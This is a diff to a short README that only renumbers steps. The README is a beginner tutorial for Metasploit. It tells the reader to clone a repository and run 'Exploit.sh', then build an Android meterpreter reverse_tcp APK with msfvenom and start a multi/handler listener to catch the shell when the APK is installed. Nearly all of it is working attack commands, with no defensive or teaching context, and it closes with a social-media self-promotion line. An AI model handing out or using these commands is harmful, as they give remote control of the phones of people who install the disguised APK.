@@ -1,17 +1,17 @@
 # Metasploit
 
 
-     Metasploit All Command👇
+  1. Metasploit All Command👇
 
      git clone https://github.com/Vretlee/Metasploit
      cd Metasploit
      bash Exploit.sh
 
-     After Install Metasploit Use This Cmd For Make App👇
+  2. After Install Metasploit Use This Cmd For Make App👇
 
      msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -a dalvik --platform android R > ~/storage/BaapG.apk
 
-     After Install Apk Use This Cmd👇
+  3. After Install Apk Use This Cmd👇
 
      msfconsole
      use exploit/multi/handler
@@ -20,7 +20,7 @@
      set LPORT 4444
      exploit
 
-     Follow Me @krish_na_2568 ☝
+  4. Follow Me @krish_na_2568 ☝
 
 
 Metasploit
